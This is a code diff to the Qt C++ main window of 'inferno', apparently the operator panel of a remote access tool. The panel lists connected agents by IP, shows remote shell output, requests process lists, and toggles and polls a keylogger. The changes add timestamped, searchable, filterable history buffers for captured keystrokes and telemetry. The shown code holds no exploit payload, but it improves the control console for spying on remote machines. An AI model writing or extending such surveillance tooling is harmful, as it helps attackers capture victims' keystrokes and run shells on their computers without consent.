@@ -7,17 +7,21 @@
 #include <QStatusBar>
 #include <QMenuBar>
 #include <QSplitter>
+#include <QDateTime>
+#include <QRegularExpression>
 #include <QLabel>
 #include <QPushButton>
 #include <QListWidget>
 #include <QPlainTextEdit>
 
+namespace {
+    constexpr int kMaxHistoryLines = 50000;
+}
+
 namespace inferno {
 
 MainWindow::MainWindow(Server* server, QWidget* parent)
     : QMainWindow(parent), m_server(server) {
-    setupUI();
-    loadStyleSheet();
     
     connect(m_server, &Server::agentConnected, this, &MainWindow::onAgentConnected);
     connect(m_server, &Server::agentDisconnected, this, &MainWindow::onAgentDisconnected);
@@ -31,7 +35,18 @@ MainWindow::MainWindow(Server* server, QWidget* parent)
     connect(m_radarTimer, &QTimer::timeout, this, &MainWindow::updateRadarAnimation);
 
     m_keylogPollTimer = new QTimer(this);
+    m_keylogPollTimer->setInterval(1500);
     connect(m_keylogPollTimer, &QTimer::timeout, this, &MainWindow::pollKeylogger);
+
+    m_searchDebounceTimer = new QTimer(this);
+    m_searchDebounceTimer->setSingleShot(true);
+    m_searchDebounceTimer->setInterval(200);
+    connect(m_searchDebounceTimer, &QTimer::timeout, this, [this](){
+        highlightSearchMatches(m_searchBox->text());
+    });
+
+    setupUI();
+    loadStyleSheet();
 }
 
 void MainWindow::setupUI() {
@@ -127,10 +142,23 @@ void MainWindow::setupUI() {
     btnClearConsole->setIcon(QIcon(":/icon_clear.png"));
     btnClearConsole->setIconSize(QSize(32, 32));
     btnClearConsole->setToolTip("Clear Console");
-    connect(btnClearConsole, &QPushButton::clicked, m_telemetryConsole, &QPlainTextEdit::clear);
+    connect(btnClearConsole, &QPushButton::clicked, this, [this](){
+        m_telemetryConsole->clear();
+        m_telemetryHistory.clear();
+        m_statusLabel->setText(" Telemetry buffer cleared");
+    });
+
+    auto* btnHistory = new QPushButton();
+    btnHistory->setObjectName("iconButton");
+    btnHistory->setFixedSize(40, 40);
+    btnHistory->setIcon(QIcon(":/icon_history.png"));
+    btnHistory->setIconSize(QSize(32, 32));
+    btnHistory->setToolTip("Load Telemetry History");
+    connect(btnHistory, &QPushButton::clicked, this, &MainWindow::loadTelemetryHistory);
 
     telemetryHeader->addWidget(btnShell);
     telemetryHeader->addWidget(btnProcs);
+    telemetryHeader->addWidget(btnHistory);
     telemetryHeader->addWidget(btnClearConsole);
     telemetryLayout->addLayout(telemetryHeader);
     
@@ -141,12 +169,14 @@ void MainWindow::setupUI() {
     m_searchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
     
     auto* btnSearch = new QPushButton();
-    btnSearch->setFixedSize(30, 30);
+    btnSearch->setFixedSize(40, 40);
     btnSearch->setIcon(QIcon(":/icon_search.png"));
+    btnSearch->setIconSize(QSize(32, 32));
     btnSearch->setObjectName("iconButton");
     connect(btnSearch, &QPushButton::clicked, this, [this](){
-        m_telemetryConsole->find(m_searchBox->text());
+        highlightSearchMatches(m_searchBox->text());
     });
+    connect(m_searchBox, &QLineEdit::textChanged, m_searchDebounceTimer, QOverload<>::of(&QTimer::start));
     
     searchLayout->addWidget(m_searchBox);
     searchLayout->addWidget(btnSearch);
@@ -178,6 +208,25 @@ void MainWindow::setupUI() {
     connect(m_btnKeylog, &QPushButton::toggled, this, &MainWindow::toggleKeylogState);
     keylogHeader->addWidget(m_btnKeylog);
     keylogLayout->addLayout(keylogHeader);
+
+    // Keylog Search & History Toolbar
+    auto* keylogToolLayout = new QHBoxLayout();
+    m_keylogSearchBox = new QLineEdit();
+    m_keylogSearchBox->setPlaceholderText("Filter keystrokes...");
+    m_keylogSearchBox->setStyleSheet("background: #000; border: 1px solid #1a1a1a; color: #00ff41; padding: 5px;");
+    connect(m_keylogSearchBox, &QLineEdit::textChanged, this, &MainWindow::filterKeylogStream);
+
+    auto* btnKeylogHistory = new QPushButton();
+    btnKeylogHistory->setObjectName("iconButton");
+    btnKeylogHistory->setFixedSize(40, 40);
+    btnKeylogHistory->setIcon(QIcon(":/icon_history.png"));
+    btnKeylogHistory->setIconSize(QSize(32, 32));
+    btnKeylogHistory->setToolTip("Load Keylog History");
+    connect(btnKeylogHistory, &QPushButton::clicked, this, &MainWindow::loadKeylogHistory);
+
+    keylogToolLayout->addWidget(m_keylogSearchBox);
+    keylogToolLayout->addWidget(btnKeylogHistory);
+    keylogLayout->addLayout(keylogToolLayout);
 
     keylogLayout->addWidget(m_keylogStream);
     mainSplitter->addWidget(keylogContainer);
@@ -219,7 +268,7 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
         item->setIcon(QIcon(":/os_mac.png"));
     }
     
-    m_telemetryConsole->appendPlainText(QString("[SYSTEM] New connection established from %1").arg(ip));
+    appendToTelemetry(QString("[SYSTEM] New connection established from %1").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 connected").arg(ip));
 }
 
@@ -228,31 +277,56 @@ void MainWindow::onAgentDisconnected(const QString& ip) {
     for (auto* item : items) {
         delete item;
     }
-    m_telemetryConsole->appendPlainText(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
+    appendToTelemetry(QString("[SYSTEM] Agent %1 has disconnected").arg(ip));
     m_statusLabel->setText(QString(" Agent %1 offline").arg(ip));
 }
 
 void MainWindow::onShellOutputReceived(const QString& ip, const QString& output) {
-    m_telemetryConsole->appendPlainText(QString("[%1] %2").arg(ip, output));
+    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
+    // Optimize: compile the regex once and reuse
+    static const QRegularExpression lineSplitter(QStringLiteral("[\r\n]+"));
+    QStringList lines = output.split(lineSplitter, Qt::SkipEmptyParts);
+    for (const QString& line : lines) {
+        QString trimmed = line.trimmed();
+        if (trimmed.isEmpty()) continue;
+        QString formatted = QString("[%1] [%2] %3").arg(timestamp, ip, trimmed);
+        appendToTelemetry(formatted);
+    }
 }
 
 void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     if (data.trimmed().isEmpty()) return;
+    QString timestamp = QDateTime::currentDateTime().toString("HH:mm:ss");
+    QString line = QString("[%1] [%2] %3").arg(timestamp, ip, data);
+    appendToKeylog(line);
+}
 
-    // Check if we need a new IP header (e.g. if previous line doesn't end with a burst from the same IP)
-    QString currentText = m_keylogStream->toPlainText();
-    bool needsHeader = currentText.isEmpty() || !currentText.endsWith(data) || !currentText.contains(ip);
-    
-    if (needsHeader) {
-        m_keylogStream->appendPlainText(QString("[%1] ").arg(ip));
+void MainWindow::appendToTelemetry(const QString& text) {
+    m_telemetryHistory.append(text);
+    if (m_telemetryHistory.size() > kMaxHistoryLines) {
+        m_telemetryHistory.removeFirst();
     }
-    
-    m_keylogStream->insertPlainText(data);
-    m_keylogStream->ensureCursorVisible();
+    // Only append to UI if it matches current filter or filter is empty
+    if (m_searchBox->text().isEmpty() || text.contains(m_searchBox->text(), Qt::CaseInsensitive)) {
+        m_telemetryConsole->appendPlainText(text);
+        if (!m_searchBox->text().isEmpty()) {
+            applyVisualHighlighting();
+        }
+    }
+}
+
+void MainWindow::appendToKeylog(const QString& text) {
+    m_keylogHistory.append(text);
+    if (m_keylogHistory.size() > kMaxHistoryLines) {
+        m_keylogHistory.removeFirst();
+    }
+    if (m_keylogSearchBox->text().isEmpty() || text.contains(m_keylogSearchBox->text(), Qt::CaseInsensitive)) {
+        m_keylogStream->appendPlainText(text);
+    }
 }
 
 void MainWindow::onStatusMessage(const QString& message) {
-    m_telemetryConsole->appendPlainText(QString("[SERVER] %1").arg(message));
+    appendToTelemetry(QString("[SERVER] %1").arg(message));
     m_statusLabel->setText(" " + message);
 }
 
@@ -338,6 +412,76 @@ void MainWindow::requestProcessList() {
     QString agentIp = item->text().split(" ").first();
     m_telemetryConsole->appendPlainText(QString("[LOCAL] Requesting Process List from %1").arg(agentIp));
     m_server->requestProcessList(agentIp);
+}
+
+void MainWindow::highlightSearchMatches(const QString& text) {
+    m_telemetryConsole->clear();
+    for (const QString& line : m_telemetryHistory) {
+        if (text.isEmpty() || line.contains(text, Qt::CaseInsensitive)) {
+            m_telemetryConsole->appendPlainText(line);
+        }
+    }
+    
+    applyVisualHighlighting();
+}
+
+void MainWindow::applyVisualHighlighting() {
+    QString text = m_searchBox->text();
+    if (text.isEmpty()) {
+        m_telemetryConsole->setExtraSelections({});
+        return;
+    }
+
+    QList<QTextEdit::ExtraSelection> extraSelections;
+    QTextDocument* doc = m_telemetryConsole->document();
+    QTextCursor cursor(doc);
+    
+    while (!cursor.isNull()) {
+        cursor = doc->find(text, cursor);
+        if (!cursor.isNull()) {
+            QTextEdit::ExtraSelection selection;
+            selection.format.setBackground(QColor(0, 255, 65, 80));
+            selection.format.setForeground(Qt::black);
+            selection.cursor = cursor;
+            extraSelections.append(selection);
+        } else {
+            break;
+        }
+    }
+    m_telemetryConsole->setExtraSelections(extraSelections);
+}
+
+void MainWindow::filterKeylogStream(const QString& text) {
+    m_keylogStream->clear();
+    for (const QString& line : m_keylogHistory) {
+        if (text.isEmpty() || line.contains(text, Qt::CaseInsensitive)) {
+            m_keylogStream->appendPlainText(line);
+        }
+    }
+}
+
+void MainWindow::loadTelemetryHistory() {
+    m_telemetryConsole->clear();
+    QString filter = m_searchBox->text();
+    for (const QString& line : m_telemetryHistory) {
+        if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
+            m_telemetryConsole->appendPlainText(line);
+        }
+    }
+    m_telemetryConsole->appendPlainText("[SYSTEM] History dump complete.");
+    m_statusLabel->setText(" Telemetry history reloaded");
+}
+
+void MainWindow::loadKeylogHistory() {
+    m_keylogStream->clear();
+    QString filter = m_keylogSearchBox->text();
+    for (const QString& line : m_keylogHistory) {
+        if (filter.isEmpty() || line.contains(filter, Qt::CaseInsensitive)) {
+            m_keylogStream->appendPlainText(line);
+        }
+    }
+    m_keylogStream->appendPlainText("[SYSTEM] Keylog history dump complete.");
+    m_statusLabel->setText(" Keylog history reloaded");
 }
 
 } // namespace inferno
